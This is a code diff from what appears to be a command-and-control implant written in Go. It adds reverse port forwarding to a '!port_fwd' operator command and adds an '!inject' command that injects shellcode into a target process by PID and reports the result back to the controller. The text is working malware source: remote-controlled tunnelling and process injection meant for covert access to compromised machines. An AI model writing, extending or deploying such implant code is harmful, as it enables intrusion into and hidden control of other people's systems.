@@ -7,6 +7,7 @@ import (
 	"log"
 	"os"
 	"os/exec"
+	"strconv"
 	"strings"
 )
 
@@ -109,29 +110,62 @@ func processCCData(data *MsgTunData) {
 		}
 
 		// port fwd
+		// cmd format: !port_fwd [to/listen] [shID] [operation]
 		if cmdSlice[0] == "!port_fwd" {
-			if len(cmdSlice) != 3 {
+			if len(cmdSlice) != 4 {
+				log.Printf("Invalid command: %v", cmdSlice)
 				return
 			}
-			switch cmdSlice[2] {
+			switch cmdSlice[3] {
 			case "stop":
 				sessionID := cmdSlice[1]
 				pf, exist := PortFwds[sessionID]
 				if exist {
 					pf.Cancel()
+					log.Printf("port mapping %s stopped", pf.Addr)
+					break
 				}
-			default:
+				log.Printf("port mapping %s not found", pf.Addr)
+			case "reverse":
+				go func() {
+					addr := cmdSlice[1]
+					sessionID := cmdSlice[2]
+					err = PortFwd(addr, sessionID, true)
+					if err != nil {
+						log.Printf("PortFwd (reverse) failed: %v", err)
+					}
+				}()
+			case "on":
 				go func() {
 					to := cmdSlice[1]
 					sessionID := cmdSlice[2]
-					err = PortFwd(to, sessionID)
+					err = PortFwd(to, sessionID, false)
 					if err != nil {
 						log.Printf("PortFwd failed: %v", err)
 					}
 				}()
+			default:
 			}
 
 			return
+		}
+
+		// GDB inject
+		if cmdSlice[0] == "!inject" {
+			if len(cmdSlice) != 3 {
+				goto send
+			}
+			out = fmt.Sprintf("%s: success", cmdSlice[1])
+			pid, err := strconv.Atoi(cmdSlice[2])
+			if err != nil {
+				log.Print("Invalid pid")
+			}
+			err = InjectShellcode(pid, cmdSlice[1])
+			if err != nil {
+				out = "failed: " + err.Error()
+			}
+			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+			goto send
 		}
 
 		// download utils.zip
